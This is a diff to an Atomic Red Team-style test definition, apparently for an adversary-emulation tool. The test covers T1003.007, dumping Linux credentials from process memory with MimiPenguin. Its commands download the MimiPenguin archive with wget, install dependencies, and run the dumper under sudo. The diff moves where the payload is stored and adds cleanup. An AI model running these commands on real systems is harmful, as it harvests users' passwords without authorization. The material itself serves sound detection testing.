@@ -12,16 +12,16 @@
   platforms:
     linux:
       sh:
-        command: 'if [ -f "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
-          ]; then : ; else wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz;
-          mkdir /tmp/mimipenguin; tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin;
+        command: 'if [ -f "mimipenguin.sh" ]; then : ; else payload_dir=$(dirname
+          "mimipenguin.sh"); mkdir -p "$payload_dir"; wget -O "$payload_dir/mimipenguin.tar.gz"
+          https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz;
+          tar -xzf "$payload_dir/mimipenguin.tar.gz" --strip-components=1 -C "$payload_dir";
           fi; if [ -x "$(command -v strings --version)" ]; then : ; else sudo apt-get
           -y install binutils; fi; if [ -x "$(command -v python2 --version)" ]; then
           : ; else sudo apt-get -y install python2; fi; if [ -x "$(command -v ldd
           --version)" ]; then : ; else sudo apt-get -y install libc-bin; fi; sudo
-          /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt;
-          cat /tmp/T1003.007Test3.txt'
-        cleanup: 'rm -f #{output_file} > /dev/null'
+          bash "mimipenguin.sh" > "/tmp/T1003.007Test3.txt"; cat "/tmp/T1003.007Test3.txt"'
+        cleanup: 'rm -f #{output_file} > /dev/null; rm -rf $(dirname "#{MimiPenguin_Location}")'
         elevation_required: true
   plugin: atomic
   singleton: false
@@ -29,8 +29,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - credential-access
   - atomic-red-team
+  - credential-access
   - t1003.007
   author: Atomic Red Team
   additional_info:
@@ -42,7 +42,7 @@
       MimiPenguin_Location:
         description: Path of MimiPenguin script
         type: path
-        default: /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh
+        default: PathToAtomicsFolder/../ExternalPayloads/mimipenguin/mimipenguin.sh
     dependencies:
     - description: 'MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})
 
@@ -51,11 +51,13 @@
         1; fi;
 
         '
-      get_prereq_command: 'wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+      get_prereq_command: 'payload_dir=$(dirname "#{MimiPenguin_Location}")
 
-        mkdir /tmp/mimipenguin
+        mkdir -p "$payload_dir"
 
-        tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
+        wget -O "$payload_dir/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+
+        tar -xzf "$payload_dir/mimipenguin.tar.gz" --strip-components=1 -C "$payload_dir"
 
         '
     - description: 'Strings must be installed
@@ -75,7 +77,9 @@
         exit 1; fi;
 
         '
-      get_prereq_command: "sudo apt-get -y install python2       \n"
+      get_prereq_command: 'sudo apt-get -y install python2
+
+        '
     - description: 'Libc-bin must be installed
 
         '
@@ -83,7 +87,9 @@
         exit 1; fi;
 
         '
-      get_prereq_command: "sudo apt-get -y install libc-bin        \n"
+      get_prereq_command: 'sudo apt-get -y install libc-bin
+
+        '
     technique_created: '2020-02-11T18:46:24.434Z'
     atomic_guid: a27418de-bdce-4ebd-b655-38f04842bf0c
-    import_timestamp: '2026-08-16T03:00:05.552747Z'
+    import_timestamp: '2026-08-17T02:58:57.014195Z'
